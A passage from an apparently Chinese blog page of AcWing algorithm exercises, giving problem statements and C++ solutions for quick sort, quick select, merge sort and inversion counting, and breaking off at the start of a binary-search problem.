\le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>53 1 2 4 5</code></pre><p><strong>输出样例：</strong></p><pre><code>1 2 3 4 5</code></pre><h3 id="题解">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = a[(l + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[++i] &lt; x) &#123;&#125;;  <span class="comment">// 没有 i &lt; j</span></span><br><span class="line">    <span class="keyword">while</span> (a[--j] &gt; x) &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">quick_sort</span>(l, j);  <span class="comment">// j, 而非i</span></span><br><span class="line">  <span class="built_in">quick_sort</span>(j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">quick_sort</span>(<span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-786-第k个数"><a href="https://www.acwing.com/problem/content/788/">AcWing 786. 第k个数</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数列，以及一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，请用快速选择算法求出数列从小到大排序后的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数（所有整数均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> 范围内），表示整数数列。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示数列的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 小数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le k \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>5 32 4 1 5 3</code></pre><p><strong>输出样例：</strong></p><pre><code>3</code></pre><h3 id="题解-2">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">quick_choose</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> a[l];</span><br><span class="line">  <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, mid = (l + r) &gt;&gt; <span class="number">1</span>, pivot = a[mid];</span><br><span class="line">  <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[++i] &lt; pivot) &#123;&#125;;</span><br><span class="line">    <span class="keyword">while</span> (a[--j] &gt; pivot) &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (k &lt;= j - l + <span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">quick_choose</span>(l, j, k);   <span class="comment">// j, 而非mid</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">quick_choose</span>(j + <span class="number">1</span>, r, k - (j - l + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, k;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">quick_choose</span>(<span class="number">0</span>, n - <span class="number">1</span>, k));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="归并排序">归并排序</h1><h2 id="AcWing-787-归并排序"><a href="https://www.acwing.com/problem/content/789/">AcWing 787. 归并排序</a></h2><p>给定你一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数列。</p><p>请你使用归并排序对这个数列按照从小到大进行排序。</p><p>并将排好序的数列按顺序输出。</p><p><strong>输入格式</strong></p><p>输入共两行，第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数（所有整数均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> 范围内），表示整个数列。</p><p><strong>输出格式</strong></p><p>输出共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示排好序的数列。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>53 1 2 4 5</code></pre><p><strong>输出样例：</strong></p><pre><code>1 2 3 4 5</code></pre><h3 id="题解-3">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], tmp[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;  <span class="comment">// 终止条件, 否则报TLE</span></span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">merge</span>(l, mid);</span><br><span class="line">  <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">      tmp[k++] = a[i++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tmp[k++] = a[j++];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = a[i++];</span><br><span class="line">  <span class="keyword">while</span> (j &lt;= r) tmp[k++] = a[j++];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) a[i] = tmp[j];  <span class="comment">// &lt;=</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">merge</span>(<span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-788-逆序对的数量"><a href="https://www.acwing.com/problem/content/790/">AcWing 788. 逆序对的数量</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数列，请你计算数列中的逆序对的数量。</p><p>逆序对的定义如下：对于数列的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个和第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个元素，如果满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>&lt;</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i &lt; j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mi>a</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[i] &gt; a[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>，则其为一个逆序对；否则不是。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，表示数列的长度。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示整个数列。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示逆序对的个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>，<br>数列中的元素的取值范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,10^9]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。</p><p><strong>输入样例：</strong></p><pre><code>62 3 4 5 6 1</code></pre><p><strong>输出样例：</strong></p><pre><code>5</code></pre><h3 id="题解-4">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], tmp[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="built_in">merge</span>(l, mid) + <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">      tmp[k++] = a[i++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tmp[k++] = a[j++];</span><br><span class="line">      res += mid - i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = a[i++];</span><br><span class="line">  <span class="keyword">while</span> (j &lt;= r) tmp[k++] = a[j++];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) a[i] = tmp[j];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">merge</span>(<span class="number">0</span>, n - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分">二分</h1><h2 id="AcWing-789-数的范围"><a href="https://www.acwing.com/problem/content/791/">AcWing 789. 数的范围</a></h2><p>给定一个按照升序排列的长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数组，以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 